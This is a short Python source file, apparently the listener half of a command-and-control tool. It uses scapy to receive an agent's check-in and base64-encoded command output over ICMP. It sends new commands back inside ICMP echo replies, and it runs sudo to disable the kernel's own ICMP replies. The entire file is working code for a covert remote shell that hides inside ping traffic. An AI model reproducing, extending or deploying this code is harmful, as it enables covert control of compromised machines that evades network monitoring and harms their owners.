from auxiliary.interface import *
from scapy.all import *
import threading
import base64
from time import sleep
import subprocess

class Icmp:
    def __init__(self):
        self.capturing = True

    def check(self, pkt, lhost, rhost, cmd):
        if pkt.haslayer(ICMP) and pkt.haslayer(Raw):
            if pkt[IP].src == rhost and pkt[IP].dst == lhost:
                if pkt[Raw].load.decode() == '_start__agent_':
                    print(info(f'\nNew session opened: {pkt[IP].src} ICMP\n'))
                else:
                    print(f'Last stdout:\n{base64.b64decode(pkt[Raw].load).decode("utf-8") if pkt[Raw].load else "-"}')

                self.capturing = False
                self.respond(lhost, rhost, cmd)

    def wait(self, lhost, rhost, cmd='-'):
        subprocess.Popen('sudo bash -c \'echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all\'', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        sniff(filter="icmp", prn=lambda pkt: self.check(pkt, lhost, rhost, cmd), stop_filter=lambda x: not self.capturing)

    def respond(self, lhost, rhost, cmd):        
        resp = IP(src=lhost, dst=rhost) / ICMP(type=0) / Raw(load=cmd)
        send(resp, verbose=0)


